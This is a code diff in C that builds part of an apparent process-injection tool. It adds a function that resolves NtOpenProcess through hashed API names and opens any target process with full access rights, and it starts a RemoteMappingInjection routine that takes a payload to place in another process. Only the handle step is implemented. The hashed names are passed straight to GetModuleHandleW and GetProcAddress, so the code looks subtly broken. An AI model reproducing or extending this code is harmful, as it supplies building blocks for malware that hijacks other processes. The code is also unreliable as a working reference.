@@ -23,7 +23,24 @@
  * @param PID  => PID of target process.
  */
 HANDLE GetGivenProcessHandle(DWORD PID){
-    
+    HANDLE         hProcess       = NULL;
+    PNTOPENPROCESS pNtOpenProcess = NULL;
+
+    CLIENT_ID CID                 = { (HANDLE)PID, NULL };
+    OBJECT_ATTRIBUTES OA          = { sizeof(OA),  NULL };
+
+    pNtOpenProcess = (PNTOPENPROCESS)GetProcAddress(GetModuleHandleW(NTDLL_HASH), NTOPEN_PROCESS_HASH);
+    if(pNtOpenProcess == NULL){
+        return NULL;
+    }
+
+    NTSTATUS OpenProcessStatus = pNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
+    if(OpenProcessStatus != STATUS_SUCCESS){
+        printf("[!] Unable to to get handle to process with PID : %i \n", PID);
+        return NULL;
+    }
+
+    return hProcess;
 }
 
 /**
@@ -33,7 +50,10 @@ HANDLE GetGivenProcessHandle(DWORD PID){
  * @param sPayloadSize => size of given payload.
  */
 BOOL RemoteMappingInjection(DWORD PID, PBYTE pPayload, SIZE_T sPayloadSize){
-    BOOL STATE = TRUE;
+    BOOL STATE      = TRUE;
+    HANDLE hProcess = NULL;
+
+    hProcess = GetGivenProcessHandle(PID);
 
     return STATE;
 }
